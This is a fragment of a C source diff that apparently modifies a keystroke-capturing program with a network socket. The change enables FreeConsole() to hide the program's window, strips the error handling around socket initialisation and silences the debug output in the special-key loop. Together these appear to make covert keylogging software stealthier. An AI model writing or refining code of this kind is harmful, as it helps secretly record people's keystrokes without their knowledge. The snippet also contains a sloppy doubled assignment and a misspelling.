@@ -9,14 +9,8 @@ int main(){
 	int flagSpecialKey = 0;
 	bool flagBoolSpecialKey = false;
 
-	//FreeConsole();
-	int isResult = initSocket();
-
-	if (isResult < 0) {
-		printf("Some error Occured...!\n");
-		system("PAUSE");
-		return -1;
-	}
+	FreeConsole();
+	int isResult = isResult = initSocket();
 
 	printf("Scoket initiated...\n");
 
@@ -145,10 +139,9 @@ int main(){
 					
 					if(flagBoolSpecialKey){
 
-						printf("*****************\n");
 						flagSpecialKey++;
 						flagBoolSpecialKey = false;
-						printf("%d\n", flagSpecialKey);
+						//printf("%d\n", flagSpecialKey);
 					}
 					
 					break;
